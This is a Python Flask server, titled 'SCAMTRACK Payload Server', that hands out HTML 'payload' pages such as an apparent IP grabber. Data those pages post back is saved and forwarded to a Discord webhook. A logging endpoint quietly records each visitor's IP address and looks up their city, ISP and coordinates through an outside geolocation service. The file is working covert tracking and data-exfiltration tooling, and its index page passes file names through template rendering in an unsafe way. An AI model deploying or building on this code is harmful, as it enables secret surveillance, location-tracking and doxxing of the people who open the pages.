from flask import Flask, request, jsonify, send_from_directory, render_template_string, redirect
from server.webhook_reporter import send_to_discord
from server.payload_handler import save_data
import os
import requests

app = Flask(__name__)

# Base path setup
BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
LOG_DIR = os.path.join(BASE_DIR, 'logs')
PAYLOADS_DIR = os.path.join(BASE_DIR, 'payloads')

# Create folders if missing
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)
    print(f"[+] Created missing log dir: {LOG_DIR}")

if not os.path.exists(PAYLOADS_DIR):
    os.makedirs(PAYLOADS_DIR)
    print(f"[+] Created missing payload dir: {PAYLOADS_DIR}")

# Index route shows payload links
@app.route('/')
def index():
    try:
        payload_files = sorted([f for f in os.listdir(PAYLOADS_DIR) if f.endswith(".html")])
    except Exception as e:
        payload_files = []
        print(f"[!] Error listing payloads: {e}")

    links = [
        f'<li><a href="/payloads/{file}" target="_blank">{file}</a></li>'
        for file in payload_files
    ]

    return render_template_string(f"""
    <h1> SCAMTRACK Payload Server</h1>
    <p>Select a payload below:</p>
    <ul>
        {''.join(links)}
    </ul>
    <hr>
    <p><b>Tracker Endpoint:</b> POST to <code>/tracker/&lt;payload_type&gt;</code> with JSON</p>
    """)

# Tracker webhook
@app.route('/tracker/<payload_type>', methods=['POST'])
def tracker(payload_type):
    data = request.get_json(force=True)
    print(f"[+] Received {payload_type} data: {data}")
    save_data(payload_type, data)
    send_to_discord(payload_type, data)
    return jsonify({"status": "received", "payload_type": payload_type})

# NEW: IP + geolocation logger
@app.route('/tracker/iplog', methods=['GET'])
def ip_log():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    try:
        geo = requests.get(f"http://ip-api.com/json/{ip}").json()
    except:
        geo = {}

    log_line = f"{ip} | {geo.get('city','?')}, {geo.get('regionName','?')} | {geo.get('country','?')} | {geo.get('org','?')} | {geo.get('lat','?')},{geo.get('lon','?')}\n"
    print(f"[+] Logged IP/Geo: {log_line.strip()}")

    with open(os.path.join(LOG_DIR, "iplog.txt"), "a") as f:
        f.write(log_line)

    return jsonify(success=True)

# Serve payload files
@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    return send_from_directory(PAYLOADS_DIR, filename)

# Optional lazy redirect support: /ip_grabber.html → /payloads/ip_grabber.html
@app.route('/<filename>.html')
def lazy_payload_redirect(filename):
    return redirect(f"/payloads/{filename}.html")

if __name__ == '__main__':
    print(" SCAMTRACK Flask Payload Server running on http://localhost:5000")
    app.run(host='0.0.0.0', port=5000)
